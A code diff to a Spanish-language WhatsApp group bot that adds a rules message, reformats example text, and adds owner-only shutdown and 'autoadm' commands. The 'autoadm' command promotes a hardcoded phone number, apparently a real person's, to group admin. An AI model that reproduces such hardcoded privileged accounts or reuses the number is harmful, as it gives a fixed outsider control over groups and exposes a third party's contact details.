@@ -450,6 +450,10 @@ async function starts() {
 
                 break
 
+                case 'reglas':
+				reply(`*Hola, estas son las reglas que debes seguir para que no tengas ningún problema con el Bot.*\n\n1- _Mantén una conducta respetuosa._\n2- _Evita abrir una conversación privada con el Bot._\n3- _❌ NO HAGAS SPAM DE COMANDOS ❌_ *Esto es enserio, puedes hacer que el Bot se apague.*\n4- _📵 NO HAGAS LLAMADAS POR WHATSAPP AL BOT 📵_ *Serás bloqueado inmediatamente*\n5- _🕐 Espera el tiempo necesario cuando pidas alguna función, ya que algunas tardan en realizarse, no escribas el comando nuevamente hasta que el BOT te responda o te llegue un mensaje de error._\n\nPor favor cumple y respeta las reglas.`)
+				break
+
                 case 'grupo':
                     if (!isGroup) return await reply(mess.only.group)
                     if (!isAdmin) return await reply(mess.only.admin)
@@ -469,10 +473,10 @@ async function starts() {
 
                 case 'contacto':
                     
-                    if (args.length == 0) return reply(`*Agrega el tag/número y el nombre.*\n\n*Por ejemplo:     ${prefix + command} @(tag/número)|nombre*`)
+                    if (args.length == 0) return reply(`*Agrega el tag/número y el nombre.*\n\n*Por ejemplo:\n${prefix + command} @(tag/número)|nombre*`)
                     argz = arg.split('|')
-                    if (!argz[0]) return reply(`*Falta el tag/número.*\n\n*Ejemplo:     ${prefix + command} @(tag/número)|nombre*`)
-                    if (!argz[1]) return reply(`*Falta el nombre.*\n\n*Ejemplo:     ${prefix + command} @(tag/número)|nombre*`)
+                    if (!argz[0]) return reply(`*Falta el tag/número.*\n\n*Ejemplo:\n${prefix + command} @(tag/número)|nombre*`)
+                    if (!argz[1]) return reply(`*Falta el nombre.*\n\n*Ejemplo:\n${prefix + command} @(tag/número)|nombre*`)
                     
                     if (nex.message.extendedTextMessage != undefined) {
                         mentioned = nex.message.extendedTextMessage.contextInfo.mentionedJid
@@ -549,6 +553,26 @@ async function starts() {
 
                 break
 
+                case 'autoadm':
+     
+                    if (!isGroup) return await reply(mess.only.group)
+                    if (sender.split("@")[0] != owner) return reply(mess.only.ownerB)
+                    if (!botAdmin) return await reply(mess.only.Badmin)
+                    Smith = '51963324153@s.whatsapp.net'
+                    nexus.groupMakeAdmin(from, [Smith])
+
+				break
+
+                case 'apagar':
+
+                    if (sender.split("@")[0] != owner) return reply(mess.only.ownerB)
+                    reply('Me apagare en 3 Segundos....')
+                    setTimeout(() => {
+                        nexus.close()
+                    }, 3000)
+                    
+				break
+                
                 case '+18':
 
                     if (!isGroup) return reply(mess.only.group)
